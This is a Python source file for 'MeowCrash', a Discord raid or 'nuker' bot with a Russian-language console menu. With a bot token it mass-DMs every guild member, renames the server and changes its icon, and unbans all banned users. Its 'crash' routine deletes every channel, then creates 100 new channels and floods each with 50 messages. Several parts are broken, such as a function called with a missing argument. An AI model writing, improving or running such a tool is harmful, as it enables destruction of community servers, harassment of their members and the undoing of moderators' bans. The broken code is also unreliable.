import disnake
from disnake.ext import commands
import colorama
from colorama import Fore, Style, init
import os
import asyncio
import aioconsole
import aiohttp
import ctypes

intents=disnake.Intents.all()

bot = commands.Bot(intents=intents, command_prefix='mc!')

bot.remove_command('help')
colorama.init()

async def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')

async def menu():
    cyan = Fore.CYAN
    red = Fore.RED
    blue = Fore.BLUE
    green = Fore.GREEN
    await clear_console()
    print(f'{cyan}        Developer: 『 thebankaidev 』| Plan: 『 SOURCE FILE 』    ')
    print(f'''{cyan}   __  __                          _____                    _     
  |  \/  |                        / ____|                  | |    
  | \  / |  ___   ___  __      __| |      _ __   __ _  ___ | |__  
  | |\/| | / _ \ / _ \ \ \ /\ / /| |     | '__| / _` |/ __|| '_ \ 
  | |  | ||  __/| (_) | \ V  V / | |____ | |   | (_| |\__ \| | | |
  |_|  |_| \___| \___/   \_/\_/   \_____||_|    \__,_||___/|_| |_|
                                                                
                                                                ''')
    print('')
    print('')
    print(f'{red} 1. Start')
    print('')
    print('')
    lang = await aioconsole.ainput(f'{green} MeowCrash -  ')
    if lang == '1':
        await rumenu()
    else:
        await clear_console()
        print(f'{red}    Error')
        await asyncio.sleep(2)
        await menu()

async def rumenu():
    red = Fore.RED
    cyan = Fore.CYAN
    await clear_console()
    print('')
    print(f'{red}   『1. Массовый спам в личные сообщения.』            『4. Посмотреть список серверов и их айди.』')
    print(f'{red}   『2. Переменовать сервер.』                         『5. Изменить аватарку серверу.』')
    print(f'{red}   『3. Удалить все каналы и заспамить их.』           『6. Разбанить всех участников сервера.』')
    print('')
    choice = await aioconsole.ainput(f'{cyan} Выберите функцию - ')

    if choice == '1':
        await clear_console()
        guild_id = await aioconsole.ainput(f'{cyan} Напишите айди сервера - ')
        text = await aioconsole.ainput(f'{cyan} Напишите текст - ')
        await mass_spamru(guild_id)
    elif choice == '2':
        await clear_console()
        guild_id = await aioconsole.ainput(f'{cyan} Напишите айди сервера - ')
        new_name = await aioconsole.ainput(f'{cyan} Напишите новое название - ')
        await renameru(guild_id, new_name)
    elif choice == '3':
        await clear_console()
        guild_id = await aioconsole.ainput(f'{cyan} Напишите айди сервера - ')
        textname = await aioconsole.ainput(f'{cyan} Напишите название каналов - ')
        text = await aioconsole.ainput(f'{cyan} Напишите текст - ')
        await crash(guild_id, textname, text)
    elif choice == '4':
        await list_servers()
    elif choice == '5':
        await clear_console()
        guild_id = await aioconsole.ainput(f'{cyan} Напишите айди сервера - ')
        avatar_url = await aioconsole.ainput(f'{cyan} Укажите сыллку на аватарку - ')
        await edit_avatar(guild_id, avatar_url)
    elif choice == '6':
        await clear_console()
        guild_id = await aioconsole.ainput(f'{cyan} Напишите айди сервера - ')
        await unbanall(guild_id)
    else:
        print(f'{red} Такой команды нету...')
        await asyncio.sleep(5)
        await rumenu()
        
async def unbanall(guild_id):
    guild = bot.get_guild(int(guild_id))
    if guild is None:
        print("Сервер не найден.")
        return

    async for ban_entry in guild.bans():
        try:
            await guild.unban(ban_entry.user)
            print(f"Разбанен {ban_entry.user} ({ban_entry.user.id})")
        except disnake.Forbidden:
            print(f"Нет прав для разбана {ban_entry.user} ({ban_entry.user.id})")
        except disnake.HTTPException as e:
            print(f"Ошибка при разбане {ban_entry.user} ({ban_entry.user.id}): {e}")

    print("Процесс разбана завершен.")
    await asyncio.sleep(2)
    await rumenu()
 
                
async def edit_avatar(guild_id, avatar_url):
    guild = bot.get_guild(int(guild_id))
    if guild is None:
        print("Сервер не найден.")
        return

    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(avatar_url) as resp:
                if resp.status != 200:
                    print("Не удалось загрузить изображение.")
                    return
                image_data = await resp.read()
        
        await guild.edit(icon=image_data)
        print(f"Аватарка сервера {guild.name} успешно изменена.")
        await asyncio.sleep(4)
        await clear_console()
        await rumenu()
    except disnake.Forbidden:
        print("У бота недостаточно прав для изменения аватарки сервера.")
        await asyncio.sleep(4)
        await clear_console()
        await rumenu()
    except disnake.HTTPException as e:
        print(f"Произошла ошибка при изменении аватарки: {e}")
        await asyncio.sleep(4)
        await clear_console()
        await rumenu()

async def mass_spamru(guild_id, text):
    guild = bot.get_guild(int(guild_id))
    if guild is None:
        print("Сервер не найден.")
        await asyncio.sleep(4)
        await rumenu()

    for member in guild.members:
        if not member.bot:
            try:
                await member.send(text)
                print(f"Сообщение отправлено: {member.name}")
            except disnake.HTTPException:
                print(f"Не удалось отправить сообщение: {member.name}")

    print("Рассылка выполнена.")
    await asyncio.sleep(5)
    await rumenu()
    
async def renameru(guild_id, new_name):
    guild = bot.get_guild(int(guild_id))
    if guild is None:
        await print('Сервер не найден.')
        await asyncio.sleep(4)
        await rumenu()
    try:
        await guild.edit(name=new_name)
        print(f"Название сервера изменено на: {new_name}")
        await asyncio.sleep(4)
        await rumenu()
    except disnake.Forbidden:
        print("У меня нет прав для изменения названия этого сервера.")
        await asyncio.sleep(4)
        await rumenu()
    except disnake.HTTPException as e:
        print(f"Произошла ошибка при изменении названия: {e}")
        await asyncio.sleep(4)
        await rumenu()
        
async def crash(guild_id, textname, text):
    guild = bot.get_guild(int(guild_id))
    if guild is None:
        print("Сервер не найден.")
        await asyncio.sleep(4)
        await rumenu()
        return

    for channel in list(guild.channels):
        try:
            await channel.delete()
            print(f"Канал удален: {channel.name}")
        except disnake.Forbidden:
            print(f"Недостаточно прав для удаления канала: {channel.name}")
        except disnake.HTTPException as e:
            print(f"Ошибка при удалении канала: {channel.name}, {e}")

    async def send_spam(new_channel, spam_message, messages_per_channel):
        for _ in range(messages_per_channel):
            await new_channel.send(spam_message)
            print(f"Сообщение отправлено в канал: {new_channel.name}")

    tasks = []
    number_of_channels = 100 
    messages_per_channel = 50

    for i in range(number_of_channels):
        try:
            new_channel = await guild.create_text_channel(f"{textname}{i}")
            print(f"Создан новый канал: {new_channel.name}")
            task = asyncio.create_task(send_spam(new_channel, text, messages_per_channel))
            tasks.append(task)
        except disnake.Forbidden:
            print(f"Недостаточно прав для создания канала или отправки сообщения.")
        except disnake.HTTPException as e:
            print(f"Ошибка при создании канала или отправке сообщения: {e}")
        except disnake.HTTPException as e:
            if e.status == 429:
                print(f"Превышен лимит запросов при создании канала: {e}. Повтор через {e.retry_after} сек.")

    await asyncio.gather(*tasks)

    print("Операция 'crash' выполнена.")
    await asyncio.sleep(4)
    await rumenu()
    
async def list_servers():
    await clear_console()
    guilds = bot.guilds
    if not guilds:
        print("        Я не нахожусь ни на одном сервере.")
        return

    response = "     Я нахожусь на следующих серверах:\n"
    response += "\n".join(f"     {guild.name} (ID: {guild.id})" for guild in guilds)
    print(response)
    await asyncio.sleep(5)
    await rumenu()                      
    


@bot.event
async def on_ready():
    cyan = Fore.CYAN
    print('')
    print('')
    print(f'     {cyan}{bot.user} успешно подключился к Discord!')
    await asyncio.sleep(4)
    await menu()

async def loginbot():
    while True:
        cyan = Fore.CYAN
        await clear_console()
        token = await aioconsole.ainput(f"     {cyan}Введите токен бота - ")
        try:
            await bot.start(token)
        except disnake.LoginFailure:
            print("     Ошибка при входе: неверный токен.")
            await asyncio.sleep(2)
            await clear_console()
            await main()
        except Exception as e:
            print(f"     Неизвестная ошибка: {e}")
            await asyncio.sleep(2)
            await clear_console()
            await main()
            

async def main():
    await loginbot()

if __name__ == "__main__":
    asyncio.run(main())